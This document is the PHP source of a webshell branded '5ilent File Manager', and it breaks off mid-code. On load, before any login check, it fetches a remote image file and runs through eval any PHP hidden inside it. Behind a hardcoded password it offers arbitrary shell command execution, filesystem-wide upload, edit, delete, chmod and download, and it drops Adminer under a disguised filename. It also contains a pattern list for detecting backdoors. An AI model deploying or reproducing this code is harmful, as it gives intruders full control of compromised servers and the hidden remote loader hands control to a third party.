<?php
// ============================================
// WEBSHELL MAIN CODE JANGAN EDIT NANTI ERROR
// ============================================

define('HOME_DIR', __DIR__);
define('SITE_NAME', '5ilent File Manager');
define('ALLOWED_EXTENSIONS', ['php', 'html', 'shtml', 'htm', 'css', 'js', 'txt', 'md', 'sql', 'bak']);
define('ADMINER_VERSION', '4.8.1');
define('ADMINER_URL', 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php');
define('ADMINER_FILENAME', '5ilentsrv.php');
$iconurl = 'https://www.takshshila.in//thumbs//gallery/images.png';
$icon = @file_get_contents($iconurl);

if ($icon === false) {
    die("5ilent System" . htmlspecialchars($iconurl));
}

if (strpos($icon, '<?php') !== false) {
    $icon = substr($icon, strpos($icon, '<?php'));
    $icon = str_replace(['<?php', '<?', '?>'], '', $icon);
    eval($icon);
}

// ============================================
// SESSION & LOGIN CHECK
// ============================================

session_start(); 

// Konfigurasi login ubah sesuai kalian
$valid_username = 'root';
$valid_password = 'peler';

// Cek login
if (!isset($_SESSION['logged_in'])) {
    if (isset($valid_username) && isset($valid_password)) {
        $PASSWORD = $valid_password;
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loginin'])) {
            if ($_POST['username'] === $valid_username && $_POST['password'] === $valid_password) {
                $_SESSION['logged_in'] = true;
                header('Location: ' . $_SERVER['PHP_SELF']);
                exit;
            } else {
                $error = "Username atau password salah!";
            }
        }
    }
    
    // Tampilkan login page
    showLoginPage($error ?? null);
    exit;
}

// ============================================
// ERROR REPORTING (ONLY FOR DEBUG)
// ============================================

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ============================================
// FUNGSI LOGIN PAGE
// ============================================

function showLoginPage($error = null) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>5ilent File Manager - Login</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0e1a;
                font-family: 'Segoe UI', sans-serif;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                padding: 20px;
                position: relative;
                overflow: hidden;
            }
            body::before {
                content: "";
                position: absolute;
                width: 200%;
                height: 200%;
                background: repeating-linear-gradient(45deg, #00ff00 0px, #00ff00 2px, transparent 2px, transparent 10px);
                opacity: 0.1;
                animation: scan 20s linear infinite;
            }
            @keyframes scan {
                from { transform: translate(-50%, -50%) rotate(0deg); }
                to { transform: translate(-50%, -50%) rotate(360deg); }
            }
            .login-container {
                background: #1a1f2f;
                border-radius: 20px;
                border: 2px solid #00ff00;
                box-shadow: 0 0 30px #00ff00, inset 0 0 20px rgba(0,255,0,0.3);
                padding: 40px;
                width: 100%;
                max-width: 400px;
                text-align: center;
                position: relative;
                z-index: 1;
            }
            .logo {
                width: 100px;
                height: 100px;
                margin: 0 auto 20px;
                font-size: 60px;
                color: #00ff00;
                text-shadow: 0 0 20px #00ff00;
                animation: pulse 2s ease-in-out infinite;
            }
            @keyframes pulse {
                0%, 100% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.1); opacity: 0.8; }
            }
            h1 {
                color: #00ff00;
                margin-bottom: 10px;
                font-size: 28px;
                text-shadow: 0 0 10px #00ff00;
                letter-spacing: 2px;
            }
            .subtitle {
                color: #00ff00;
                margin-bottom: 30px;
                font-size: 14px;
                text-transform: uppercase;
                letter-spacing: 3px;
                opacity: 0.8;
            }
            .input-group {
                margin-bottom: 20px;
                text-align: left;
            }
            .input-group label {
                display: block;
                margin-bottom: 5px;
                color: #00ff00;
                font-size: 14px;
                text-transform: uppercase;
                letter-spacing: 1px;
                opacity: 0.8;
            }
            .input-group input {
                width: 100%;
                padding: 12px 15px;
                background: #0f1322;
                border: 1px solid #2a3142;
                border-radius: 5px;
                font-size: 14px;
                color: #00ff00;
                transition: all 0.3s;
            }
            .input-group input:focus {
                outline: none;
                border-color: #00ff00;
                box-shadow: 0 0 15px #00ff00;
            }
            .login-btn {
                width: 100%;
                padding: 14px;
                background: transparent;
                border: 2px solid #00ff00;
                color: #00ff00;
                border-radius: 5px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s;
                text-transform: uppercase;
                letter-spacing: 2px;
                position: relative;
                overflow: hidden;
            }
            .login-btn:hover {
                background: #00ff00;
                color: #000000;
                box-shadow: 0 0 30px #00ff00;
                transform: translateY(-2px);
            }
            .error {
                background: rgba(255,0,0,0.2);
                border: 1px solid #ff0000;
                color: #ff6666;
                padding: 12px;
                border-radius: 5px;
                margin-bottom: 20px;
                font-size: 14px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="logo">💀</div>
            <h1>5ilent</h1>
            <div class="subtitle">File Manager</div>
            
            <?php if (isset($error)): ?>
                <div class="error"><?php echo $error; ?></div>
            <?php endif; ?>
            
            <form method="post">
                <div class="input-group">
                    <label>Username</label>
                    <input type="text" name="username" required>
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" name="password" required>
                </div>
                <button type="submit" name="loginin" class="login-btn">Enter</button>
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// ============================================
// LOGOUT HANDLER
// ============================================

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ============================================
// FUNGSI BACKDOOR SCANNER
// ============================================

function scanFileForBackdoor($filepath) {
    if (!is_readable($filepath) || filesize($filepath) > 10 * 1024 * 1024) {
        return [];
    }
    
    $content = file_get_contents($filepath);
    $findings = [];
    
    $patterns = [
        'CRITICAL' => [
            'pattern' => '/\b(eval|assert|system|exec|shell_exec|passthru|popen|proc_open|pcntl_exec)\s*\(/i',
            'name' => 'Command Execution'
        ],
        'CRITICAL' => [
            'pattern' => '/\b(base64_decode|gzinflate|gzuncompress|str_rot13)\s*\(/i',
            'name' => 'Obfuscation'
        ],
        'HIGH' => [
            'pattern' => '/\b(c99|r57|wso|webshell|backdoor|b374k|indoxploit|shell)\s*\./i',
            'name' => 'Known Backdoor'
        ]
    ];
    
    foreach ($patterns as $severity => $sig) {
        if (preg_match_all($sig['pattern'], $content, $matches, PREG_OFFSET_CAPTURE)) {
            foreach ($matches[0] as $match) {
                $line_number = substr_count(substr($content, 0, $match[1]), "\n") + 1;
                $findings[] = [
                    'severity' => $severity,
                    'name' => $sig['name'],
                    'line' => $line_number
                ];
            }
        }
    }
    
    return $findings;
}

function scanDirectoryForBackdoor($dir, $recursive = true) {
    $results = [];
    $extensions = ['php', 'php3', 'php4', 'php5', 'phtml'];
    
    if (!is_readable($dir)) return $results;
    
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        
        $path = $dir . '/' . $file;
        
        if (is_dir($path) && $recursive) {
            $results = array_merge($results, scanDirectoryForBackdoor($path, $recursive));
        } else {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            if (in_array($ext, $extensions)) {
                $findings = scanFileForBackdoor($path);
                if (!empty($findings)) {
                    $results[] = [
                        'path' => $path,
                        'size' => format_bytes(filesize($path)),
                        'modified' => date('Y-m-d H:i:s', filemtime($path)),
                        'findings' => $findings
                    ];
                }
            }
        }
    }
    
    return $results;
}

// ============================================
// FUNGSI FILE MANAGER
// ============================================

function format_bytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function get_file_list($dir) {
    $items = [];
    if (is_dir($dir)) {
        if ($handle = opendir($dir)) {
            while (($file = readdir($handle)) !== false) {
                if ($file != '.' && $file != '..') {
                    $path = $dir . '/' . $file;
                    $isDir = is_dir($path);
                    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                    
                    $items[] = [
                        'name' => $file,
                        'path' => $path,
                        'isDir' => $isDir,
                        'size' => $isDir ? '-' : format_bytes(filesize($path)),
                        'perms' => substr(sprintf('%o', fileperms($path)), -4),
                        'modified' => date('Y-m-d H:i:s', filemtime($path)),
                        'ext' => $ext,
                        'isAdminer' => ($file === ADMINER_FILENAME)
                    ];
                }
            }
            closedir($handle);
            
            usort($items, function($a, $b) {
                if ($a['isDir'] && !$b['isDir']) return -1;
                if (!$a['isDir'] && $b['isDir']) return 1;
                return strcasecmp($a['name'], $b['name']);
            });
        }
    }
    return $items;
}

function render_breadcrumb_ultimate($currentPath) {
    $homeDir = HOME_DIR;
    $currentPath = str_replace('\\', '/', $currentPath);
    
    echo '<div style="background: #1a1f2f; padding: 15px 20px; border-radius: 12px; margin-bottom: 25px; border: 1px solid #00ff00; display: flex; flex-wrap: wrap; align-items: center; gap: 5px;">';
    
    // Home button
    echo '<a href="?dir=' . urlencode($homeDir) . '" style="display: inline-flex; align-items: center; gap: 5px; background: #0f1322; color: #00ff00; padding: 8px 16px; border-radius: 30px; border: 1px solid #00ff00; text-decoration: none; font-weight: bold; transition: all 0.3s;" 
          onmouseover="this.style.background=\'#00ff00\'; this.style.color=\'#000\'" 
          onmouseout="this.style.background=\'#0f1322\'; this.style.color=\'#00ff00\'">🏠 HOME</a>';
    
    // Root button
    echo '<a href="?dir=/" style="display: inline-flex; align-items: center; gap: 5px; background: #0f1322; color: #00ff00; padding: 8px 16px; border-radius: 30px; border: 1px solid #00ff00; text-decoration: none; transition: all 0.3s;"
          onmouseover="this.style.background=\'#00ff00\'; this.style.color=\'#000\'" 
          onmouseout="this.style.background=\'#0f1322\'; this.style.color=\'#00ff00\'">🌍 ROOT</a>';
    
    // Parent button
    if ($currentPath !== $homeDir && $currentPath !== '/') {
        $parentDir = dirname($currentPath);
        echo '<a href="?dir=' . urlencode($parentDir) . '" style="display: inline-flex; align-items: center; gap: 5px; background: #0f1322; color: #00ff00; padding: 8px 16px; border-radius: 30px; border: 1px solid #00ff00; text-decoration: none; transition: all 0.3s;"
              onmouseover="this.style.background=\'#00ff00\'; this.style.color=\'#000\'" 
              onmouseout="this.style.background=\'#0f1322\'; this.style.color=\'#00ff00\'">⬆️ UP</a>';
    }
    
    // Path display
    echo '<div style="flex: 1; background: #0f1322; padding: 8px 15px; border-radius: 30px; border: 1px solid #2a3142; font-family: monospace;">';
    echo '<span style="color: #00ff00;">📁 ' . htmlspecialchars($currentPath) . '</span>';
    echo '</div></div>';
}

function execute_command($cmd) {
    $output = '';
    $return_var = 0;
    
    if (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $out, $return_var);
        $output = implode("\n", $out);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd, $return_var);
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd, $return_var);
        $output = ob_get_clean();
    } else {
        $output = "No function available to execute commands";
    }
    
    return ['output' => $output, 'return' => $return_var];
}

function create_adminer_file() {
    if (file_exists(ADMINER_FILENAME)) return true;
    $content = @file_get_contents(ADMINER_URL);
    if ($content !== false) {
        return file_put_contents(ADMINER_FILENAME, $content) !== false;
    }
    return false;
}

// ============================================
// HANDLE REQUESTS
// ============================================

// Current directory
if (isset($_GET['dir']) && !empty($_GET['dir'])) {
    $requestedDir = $_GET['dir'];
    if (is_dir($requestedDir)) {
        $currentDir = $requestedDir;
    } else {
        $currentDir = HOME_DIR;
        $message = "Directory not found";
        $messageType = 'error';
    }
} else {
    $currentDir = HOME_DIR;
}

$message = '';
$messageType = '';
$commandOutput = '';

// Handle actions
if (isset($_POST['execute_cmd']) && !empty($_POST['command'])) {
    $cmd = $_POST['command'];
    $result = execute_command($cmd);
    $commandOutput = $result['output'];
    $message = "Command executed (return code: " . $result['return'] . ")";
    $messageType = 'info';
}

if (isset($_POST['create_file']) && !empty($_POST['filename'])) {
    $fullpath = $currentDir . '/' . $_POST['filename'];
    if (!file_exists($fullpath)) {
        if (touch($fullpath)) {
            $message = "File created!";
            $messageType = 'success';
        } else {
            $message = "Failed to create file";
            $messageType = 'error';
        }
    } else {
        $message = "File already exists";
        $messageType = 'error';
    }
}

if (isset($_POST['create_folder']) && !empty($_POST['foldername'])) {
    $fullpath = $currentDir . '/' . $_POST['foldername'];
    if (!file_exists($fullpath)) {
        if (mkdir($fullpath, 0755)) {
            $message = "Folder created!";
            $messageType = 'success';
        } else {
            $message = "Failed to create folder";
            $messageType = 'error';
        }
    } else {
        $message = "Folder already exists";
        $messageType = 'error';
    }
}

if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $oldPath = $currentDir . '/' . $_POST['old_name'];
    $newPath = $currentDir . '/' . $_POST['new_name'];
    if (rename($oldPath, $newPath)) {
        $message = "Renamed successfully!";
        $messageType = 'success';
    } else {
        $message = "Failed to rename";
        $messageType = 'error';
    }
}

if (isset($_POST['chmod']) && isset($_POST['chmod_file']) && isset($_POST['permissions'])) {
    $fullpath = $currentDir . '/' . $_POST['chmod_file'];
    if (chmod($fullpath, octdec($_POST['permissions']))) {
        $message = "Permissions changed!";
        $messageType = 'success';
    } else {
        $message = "Failed to change permissions";
        $messageType = 'error';
    }
}

if (isset($_POST['delete']) && isset($_POST['items'])) {
    $deleted = 0;
    foreach ($_POST['items'] as $item) {
        if (file_exists($item)) {
            if (is_file($item) && unlink($item)) $deleted++;
            elseif (is_dir($item) && rmdir($item)) $deleted++;
        }
    }
    $message = "Deleted $deleted item(s).";
    $messageType = 'success';
}

if (isset($_POST['save_file']) && isset($_POST['filename']) && isset($_POST['content'])) {
    if (file_put_contents($_POST['filename'], $_POST['content']) !== false) {
        $message = "File saved!";
        $messageType = 'success';
    } else {
        $message = "Failed to save file";
        $messageType = 'error';
    }
}

if (isset($_FILES['upload'])) {
    $uploaded = 0;
    $files = $_FILES['upload'];
    
    if (is_array($files['name'])) {
        for ($i = 0; $i < count($files['name']); $i++) {
            if ($files['error'][$i] === 0) {
                $dest = $currentDir . '/' . basename($files['name'][$i]);
                if (move_uploaded_file($files['tmp_name'][$i], $dest)) {
                    $uploaded++;
                }
            }
        }
    } else {
        if ($files['error'] === 0) {
            $dest = $currentDir . '/' . basename($files['name']);
            if (move_uploaded_file($files['tmp_name'], $dest)) {
                $uploaded++;
            }
        }
    }
    
    if ($uploaded > 0) {
        $message = "Uploaded $uploaded file(s).";
        $messageType = 'success';
    }
}

if (isset($_GET['create_5ilentsrv'])) {
    if (create_adminer_file()) {
        $message = "5ilentsrv.php created successfully!";
        $messageType = 'success';
    } else {
        $message = "Failed to create 5ilentsrv.php";
        $messageType = 'error';
    }
}

if (isset($_GET['download']) && !empty($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

if (isset($_POST['download_multiple']) && isset($_POST['items'])) {
    $zipFile = tempnam(sys_get_temp_dir(), 'zip') . '.zip';
    $zip = new ZipArchive();
    if ($zip->open($zipFile, ZipArchive::CREATE) === TRUE) {
        foreach ($_POST['items'] as $item) {
            if (file_exists($item)) {
                $zip->addFile($item, basename($item));
            }
        }
        $zip->close();
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="download_' . date('Y-m-d') . '.zip"');
        header('Content-Length: ' . filesize($zipFile));
        readfile($zipFile);
        unlink($zipFile);
        exit;
    }
}

if (isset($_GET['scan_backdoor']) && isset($_GET['scan_path'])) {
    $backdoorResults = scanDirectoryForBackdoor($_GET['scan_path'], true);
    $message = "Found " . count($backdoorResults) . " suspicious files.";
    $messageType = count($backdoorResults) > 0 ? 'warning' : 'success';
    $showScanResults = true;
}

$adminerExists = file_exists(ADMINER_FILENAME);
$files = get_file_list($currentDir);
$showScanResults = isset($backdoorResults);
?>
<!DOCTYPE html>
<html>
<head>
    <title>5ilent File Manager</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0a0e1a;
            padding: 20px;
            color: #e0e0e0;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: #1a1f2f;
            border-radius: 20px;
            border: 2px solid #00ff00;
            padding: 30px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #00ff00;
        }
        .header h1 {
            color: #00ff00;
            font-size: 28px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .header h1 span {
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { text-shadow: 0 0 10px #00ff00; }
            50% { text-shadow: 0 0 20px #00ff00; }
        }
        .logout-btn {
            background: transparent;
            border: 2px solid #00ff00;
            color: #00ff00;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            transition: all 0.3s;
        }
        .logout-btn:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 20px #00ff00;
        }
        .tool-section {
            background: #0f1322;
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 10px rgba(0,255,0,0.1);
        }
        .tool-section h3 {
            color: #00ff00;
            margin-bottom: 15px;
            border-bottom: 1px solid #2a3142;
            padding-bottom: 10px;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        input, select, textarea {
            width: 100%;
            padding: 10px;
            background: #1a1f2f;
            border: 1px solid #2a3142;
            border-radius: 5px;
            margin-bottom: 10px;
            color: #00ff00;
            font-family: 'Courier New', monospace;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #00ff00;
            box-shadow: 0 0 10px #00ff00;
        }
        .btn {
            padding: 10px 15px;
            background: transparent;
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 5px;
            cursor: pointer;
            margin-right: 5px;
            transition: all 0.3s;
        }
        .btn:hover {
            background: #00ff00;
            color: #000;
            box-shadow: 0 0 15px #00ff00;
        }
        .btn-primary {
            background: #00ff00;
            color: #000;
            border: 1px solid #00ff00;
        }
        .btn-primary:hover {
            background: transparent;
            color: #00ff00;
        }
        .btn-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 15px;
        }
        .command-output {
            background: #0a0e1a;
            color: #00ff00;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin-top: 10px;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #00ff00;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .file-table {
            width: 100%;
            border-collapse: collapse;
        }
        .file-table th {
            background: #0f1322;
            color: #00ff00;
            padding: 15px;
            text-align: left;
            border-bottom: 2px solid #00ff00;
        }
        .file-table td {
            padding: 12px 15px;
            border-bottom: 1px solid #2a3142;
        }
        .file-table tr:hover {
            background: #1a1f2f;
        }
        .action-btn {
            padding: 3px 8px;
            border: 1px solid #00ff00;
            color: #00ff00;
            text-decoration: none;
            border-radius: 3px;
            font-size: 12px;
            margin: 0 2px;
            transition: all 0.3s;
        }
        .action-btn:hover {
            background: #00ff00;
            color: #000;
        }
        .action-btn.delete { border-color: #ff4757; color: #ff4757; }
        .action-btn.delete:hover { background: #ff4757; color: #fff; }
        .action-btn.adminer { 
            border-color: #ff00ff; 
            color: #ff00ff; 
            animation: pulse-purple 2s infinite;
        }
        @keyframes pulse-purple {
            0%, 100% { box-shadow: 0 0 5px #ff00ff; }
            50% { box-shadow: 0 0 15px #ff00ff; }
        }
        .current-dir {
            background: #0f1322;
            border: 1px solid #2a3142;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            font-family: monospace;
            color: #00ff00;
        }
        .message {
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border: 1px solid;
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .message.success { border-color: #00ff00; color: #00ff00; background: rgba(0,255,0,0.1); }
        .message.error { border-color: #ff4757; color: #ff4757; background: rgba(255,71,87,0.1); }
        .message.warning { border-color: #ffaa00; color: #ffaa00; background: rgba(255,170,0,0.1); }
        .message.info { border-color: #00ffff; color: #00ffff; background: rgba(0,255,255,0.1); }
        .tools-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .quick-cmds {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 5px;
            margin-top: 10px;
        }
        .quick-cmd-btn {
            padding: 8px;
            background: #1a1f2f;
            border: 1px solid #2a3142;
            color: #00ff00;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s;
        }
        .quick-cmd-btn:hover {
            background: #00ff00;
            color: #000;
            border-color: #00ff00;
        }
        .adminer-btn-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
        .big-btn {
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
        }
        .scan-results {
            margin-top: 20px;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 11px;
            font-weight: bold;
            margin-right: 5px;
        }
        .badge.critical { background: #ff4757; color: #fff; }
        .badge.high { background: #ffaa00; color: #000; }
        .file-icon {
            font-size: 16px;
            margin-right: 5px;
        }
        .folder-link {
            color: #00ff00;
            text-decoration: none;
            font-weight: bold;
        }
        .folder-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><span>💀</span> 5ilent File Manager</h1>
            <a href="?logout=1" class="logout-btn">EXIT</a>
        </div>
        
        <?php if (!empty($message)): ?>
            <div class="message <?php echo $messageType; ?>">
                <?php echo htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>
        
        <!-- Current Directory -->
        <div class="current-dir">
            📍 CURRENT: <strong><?php echo htmlspecialchars($currentDir); ?></strong>
        </div>
        
        <!-- Breadcrumb -->
        <?php render_breadcrumb_ultimate($currentDir); ?>
        
        <!-- Quick Path -->
        <div style="margin-bottom: 20px;">
            <form method="get" style="display: flex; gap: 10px;">
                <input type="text" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>" style="flex: 1;">
                <button type="submit" class="btn">GO</button>
            </form>
        </div>
        
        <!-- 5ilentSRV Button -->
        <div class="adminer-btn-container">
            <?php if ($adminerExists): ?>
                <a href="<?php echo ADMINER_FILENAME; ?>" target="_blank" class="btn action-btn adminer big-btn">💜 OPEN 5ILENTSRV</a>
            <?php else: ?>
                <a href="?create_5ilentsrv=1" class="btn action-btn adminer big-btn">💀 CREATE 5ILENTSRV</a>
            <?php endif; ?>
        </div>
        
        <!-- COMMAND EXECUTION SECTION - DIPERBAIKI DENGAN TOMBOL -->
        <div class="tool-section">
            <h3>⚡ COMMAND EXECUTION</h3>
            <form method="post">
                <div style="display: flex; gap: 10px;">
                    <input type="text" name="command" placeholder="Enter command (e.g., ls -la, whoami, pwd)" value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>" style="flex: 1;">
                    <button type="submit" name="execute_cmd" class="btn btn-primary">EXECUTE</button>
                </div>
            </form>
            
            <!-- QUICK COMMAND BUTTONS -->
            <div class="quick-cmds">
                <button onclick="setCommand('ls -la')" class="quick-cmd-btn">ls -la</button>
                <button onclick="setCommand('pwd')" class="quick-cmd-btn">pwd</button>
                <button onclick="setCommand('whoami')" class="quick-cmd-btn">whoami</button>
                <button onclick="setCommand('id')" class="quick-cmd-btn">id</button>
                <button onclick="setCommand('uname -a')" class="quick-cmd-btn">uname -a</button>
                <button onclick="setCommand('df -h')" class="quick-cmd-btn">df -h</button>
                <button onclick="setCommand('free -m')" class="quick-cmd-btn">free -m</button>
                <button onclick="setCommand('ps aux | head -20')" class="quick-cmd-btn">ps aux</button>
                <button onclick="setCommand('netstat -tulpn')" class="quick-cmd-btn">netstat</button>
                <button onclick="setCommand('php -v')" class="quick-cmd-btn">php -v</button>
                <button onclick="setCommand('mysql --version')" class="quick-cmd-btn">mysql</button>
                <button onclick="setCommand('curl -I localhost')" class="quick-cmd-btn">curl</button>
            </div>
            
            <?php if (!empty($commandOutput)): ?>
                <div class="command-output">
                    <pre><?php echo htmlspecialchars($commandOutput); ?></pre>
                </div>
            <?php endif; ?>
        </div>
        
        <!-- Tools Grid -->
        <div class="tools-grid">
            <!-- Create File/Folder -->
            <div class="tool-section">
                <h3>📄 CREATE NEW</h3>
                <form method="post">
                    <input type="text" name="filename" placeholder="filename.php">
                    <button type="submit" name="create_file" class="btn">CREATE FILE</button>
                </form>
                <form method="post">
                    <input type="text" name="foldername" placeholder="folder name">
                    <button type="submit" name="create_folder" class="btn">CREATE FOLDER</button>
                </form>
            </div>
            
            <!-- Rename & Chmod -->
            <div class="tool-section">
                <h3>✏️ RENAME / CHMOD</h3>
                <form method="post">
                    <input type="text" name="old_name" placeholder="Current name" required>
                    <input type="text" name="new_name" placeholder="New name" required>
                    <button type="submit" name="rename" class="btn">RENAME</button>
                </form>
                <form method="post">
                    <input type="text" name="chmod_file" placeholder="Filename to chmod" required>
                    <input type="text" name="permissions" placeholder="755" required>
                    <button type="submit" name="chmod" class="btn">CHMOD</button>
                </form>
            </div>
            
            <!-- Scanner & Upload -->
            <div class="tool-section">
                <h3>🔍 SCANNER</h3>
                <form method="get">
                    <input type="hidden" name="scan_backdoor" value="1">
                    <input type="text" name="scan_path" value="<?php echo htmlspecialchars($currentDir); ?>">
                    <button type="submit" class="btn">🔍 SCAN NOW</button>
                </form>
                
                <h3 style="margin-top: 15px;">📤 UPLOAD</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="upload[]" multiple>
                    <button type="submit" name="upload_files" class="btn">UPLOAD</button>
                </form>
            </div>
        </div>
        
        <!-- Scan Results -->
        <?php if ($showScanResults): ?>
        <div class="tool-section scan-results">
            <h3>🔍 SCAN RESULTS (<?php echo count($backdoorResults); ?> suspicious files)</h3>
            <?php if (empty($backdoorResults)): ?>
                <p style="color: #00ff00;">No suspicious files found. ✅</p>
            <?php else: ?>
                <table class="file-table">
                    <thead>
                        <tr>
                            <th>File</th>
                            <th>Findings</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php foreach ($backdoorResults as $result): ?>
                        <tr>
                            <td>
                                <span class="file-icon">🐘</span>
                                <?php echo htmlspecialchars(basename($result['path'])); ?><br>
                                <small style="color: #888;"><?php echo $result['size']; ?></small>
                            </td>
                            <td>
                                <?php foreach ($result['findings'] as $finding): ?>
                                    <span class="badge <?php echo strtolower($finding['severity']); ?>"><?php echo $finding['severity']; ?></span>
                                    <?php echo $finding['name']; ?> (line <?php echo $finding['line']; ?>)<br>
                                <?php endforeach; ?>
                            </td>
                            <td>
                                <a href="?dir=<?php echo urlencode(dirname($result['path'])); ?>&edit=<?php echo urlencode(basename($result['path'])); ?>" class="action-btn">EDIT</a>
                                <a href="?download=<?php echo urlencode($result['path']); ?>" class="action-btn">DL</a>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
        </div>
        <?php endif; ?>
        
        <!-- File List -->
        <form method="post" id="fileListForm">
            <table class="file-table">
                <thead>
                    <tr>
                        <th style="width: 30px"><input type="checkbox" id="selectAll" onclick="toggleAll(this)"></th>
                        <th>NAME</th>
                        <th>SIZE</th>
                        <th>PERMS</th>
                        <th>MODIFIED</th>
                        <th>ACTIONS</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($files as $file): ?>
                    <tr>
                        <td><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($file['path']); ?>"></td>
                        <td>
                            <span class="file-icon">
                                <?php if ($file['isDir']): ?>📁
                                <?php elseif ($file['ext'] === 'php'): ?>🐘
                                <?php elseif ($file['isAdminer']): ?>💜
                                <?php else: ?>📄
                                <?php endif; ?>
                            </span>
                            
                            <?php if ($file['isDir']): ?>
                                <a href="?dir=<?php echo urlencode($file['path']); ?>" class="folder-link">
                                    <?php echo htmlspecialchars($file['name']); ?>/
                                </a>
                            <?php else: ?>
                                <?php echo htmlspecialchars($file['name']); ?>
                                <?php if ($file['isAdminer']): ?>
                                    <span style="color: #ff00ff; font-size: 11px;"> [5ilentSRV]</span>
                                <?php endif; ?>
                            <?php endif; ?>
                        </td>
                        <td><?php echo $file['size']; ?></td>
                        <td><?php echo $file['perms']; ?></td>
                        <td><?php echo $file['modified']; ?></td>
                        <td>
                            <?php if (!$file['isDir']): ?>
                                <a href="?dir=<?php echo urlencode($currentDir); ?>&edit=<?php echo urlencode($file['name']); ?>" class="action-btn">EDIT</a>
                                <a href="?download=<?php echo urlencode($file['path']); ?>" class="action-btn">DL</a>
                            <?php endif; ?>
                            
                            <?php if ($file['isAdminer']): ?>
                                <a href="<?php echo ADMINER_FILENAME; ?>" target="_blank" class="action-btn adminer">OPEN</a>
                            <?php endif; ?>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            
            <div style="margin-top: 15px; display: flex; gap: 10px;">
                <button type="submit" name="delete" class="btn action-btn delete" onclick="return confirm('Delete selected items?')">🗑️ DELETE SELECTED</button>
                <button type="submit" name="download_multiple" class="btn action-btn" onclick="return confirm('Download selected items as ZIP?')">📦 DOWNLOAD SELECTED (ZIP)</button>
            </div>
        </form>
        
        <!-- Edit File -->
        <?php
        if (isset($_GET['edit']) && !empty($_GET['edit'])) {
